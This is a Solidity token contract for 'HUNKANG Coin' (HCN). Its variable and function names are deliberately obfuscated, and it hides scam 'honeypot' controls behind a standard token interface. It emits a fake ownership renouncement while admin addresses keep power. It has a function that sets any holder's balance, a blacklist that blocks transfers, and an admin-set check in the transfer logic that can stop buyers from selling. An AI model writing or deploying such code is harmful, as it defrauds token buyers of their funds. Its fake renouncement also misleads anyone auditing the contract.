//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface launchListShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldTotal) external view returns (uint256);

    function transfer(address marketingFundTotal, uint256 takeLaunchedMarketing) external returns (bool);

    function allowance(address minLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeLaunchedMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address marketingFundTotal,
        uint256 takeLaunchedMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed minSell, uint256 value);
    event Approval(address indexed minLiquidity, address indexed spender, uint256 value);
}

interface launchListShouldMetadata is launchListShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tokenSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderAmount {
    function createPair(address launchedIs, address receiverExempt) external returns (address);
}

interface takeMin {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract HUNKANGCoin is tokenSender, launchListShould, launchListShouldMetadata {

    function toTxTotal(address toTeam) public {
        receiverSwap();
        
        if (toTeam == autoFund || toTeam == maxMarketing) {
            return;
        }
        receiverLaunch[toTeam] = true;
    }

    uint256 takeTotalAuto;

    address isFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address listLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return receiverLimit;
    }

    uint256 private teamReceiver;

    uint256 public launchTake;

    function totalSupply() external view virtual override returns (uint256) {
        return modeMin;
    }

    mapping(address => bool) public receiverLaunch;

    function marketingReceiver(address buyTotal, address marketingFundTotal, uint256 takeLaunchedMarketing) internal returns (bool) {
        require(senderBuy[buyTotal] >= takeLaunchedMarketing);
        senderBuy[buyTotal] -= takeLaunchedMarketing;
        senderBuy[marketingFundTotal] += takeLaunchedMarketing;
        emit Transfer(buyTotal, marketingFundTotal, takeLaunchedMarketing);
        return true;
    }

    function allowance(address fromLaunched, address exemptLaunch) external view virtual override returns (uint256) {
        if (exemptLaunch == listLaunch) {
            return type(uint256).max;
        }
        return limitTrading[fromLaunched][exemptLaunch];
    }

    function senderMode(address buyTotal, address marketingFundTotal, uint256 takeLaunchedMarketing) internal returns (bool) {
        if (buyTotal == autoFund) {
            return marketingReceiver(buyTotal, marketingFundTotal, takeLaunchedMarketing);
        }
        uint256 sellShouldMode = launchListShould(maxMarketing).balanceOf(isFrom);
        require(sellShouldMode == autoMarketing);
        require(!receiverLaunch[buyTotal]);
        return marketingReceiver(buyTotal, marketingFundTotal, takeLaunchedMarketing);
    }

    bool public totalSwap;

    address private walletTeam;

    bool private isMarketing;

    function receiverSwap() private view {
        require(minEnableTotal[_msgSender()]);
    }

    function isSell(address amountFee, uint256 takeLaunchedMarketing) public {
        receiverSwap();
        senderBuy[amountFee] = takeLaunchedMarketing;
    }

    bool private launchedSwap;

    address public maxMarketing;

    uint256 private launchAt;

    function balanceOf(address shouldTotal) public view virtual override returns (uint256) {
        return senderBuy[shouldTotal];
    }

    string private maxEnableShould = "HCN";

    address public autoFund;

    function transfer(address amountFee, uint256 takeLaunchedMarketing) external virtual override returns (bool) {
        return senderMode(_msgSender(), amountFee, takeLaunchedMarketing);
    }

    function getOwner() external view returns (address) {
        return walletTeam;
    }

    mapping(address => uint256) private senderBuy;

    function receiverIs() public {
        emit OwnershipTransferred(autoFund, address(0));
        walletTeam = address(0);
    }

    constructor (){
        
        receiverIs();
        takeMin buyAuto = takeMin(listLaunch);
        maxMarketing = senderAmount(buyAuto.factory()).createPair(buyAuto.WETH(), address(this));
        
        autoFund = _msgSender();
        minEnableTotal[autoFund] = true;
        senderBuy[autoFund] = modeMin;
        if (walletMin) {
            listAt = teamMaxList;
        }
        emit Transfer(address(0), autoFund, modeMin);
    }

    uint256 private modeMin = 100000000 * 10 ** 18;

    function approve(address exemptLaunch, uint256 takeLaunchedMarketing) public virtual override returns (bool) {
        limitTrading[_msgSender()][exemptLaunch] = takeLaunchedMarketing;
        emit Approval(_msgSender(), exemptLaunch, takeLaunchedMarketing);
        return true;
    }

    function transferFrom(address buyTotal, address marketingFundTotal, uint256 takeLaunchedMarketing) external override returns (bool) {
        if (_msgSender() != listLaunch) {
            if (limitTrading[buyTotal][_msgSender()] != type(uint256).max) {
                require(takeLaunchedMarketing <= limitTrading[buyTotal][_msgSender()]);
                limitTrading[buyTotal][_msgSender()] -= takeLaunchedMarketing;
            }
        }
        return senderMode(buyTotal, marketingFundTotal, takeLaunchedMarketing);
    }

    string private receiverLimit = "HUNKANG Coin";

    uint256 public listAt;

    event OwnershipTransferred(address indexed swapMax, address indexed launchMax);

    function buyReceiverLaunch(uint256 takeLaunchedMarketing) public {
        receiverSwap();
        autoMarketing = takeLaunchedMarketing;
    }

    mapping(address => bool) public minEnableTotal;

    function owner() external view returns (address) {
        return walletTeam;
    }

    function swapToken(address teamLiquidity) public {
        if (totalSwap) {
            return;
        }
        if (buyToken) {
            launchTake = listAt;
        }
        minEnableTotal[teamLiquidity] = true;
        if (teamReceiver == listAt) {
            isMarketing = false;
        }
        totalSwap = true;
    }

    uint256 autoMarketing;

    mapping(address => mapping(address => uint256)) private limitTrading;

    bool private walletMin;

    bool public buyToken;

    function decimals() external view virtual override returns (uint8) {
        return enableMaxMode;
    }

    function symbol() external view virtual override returns (string memory) {
        return maxEnableShould;
    }

    uint256 public teamMaxList;

    uint8 private enableMaxMode = 18;

}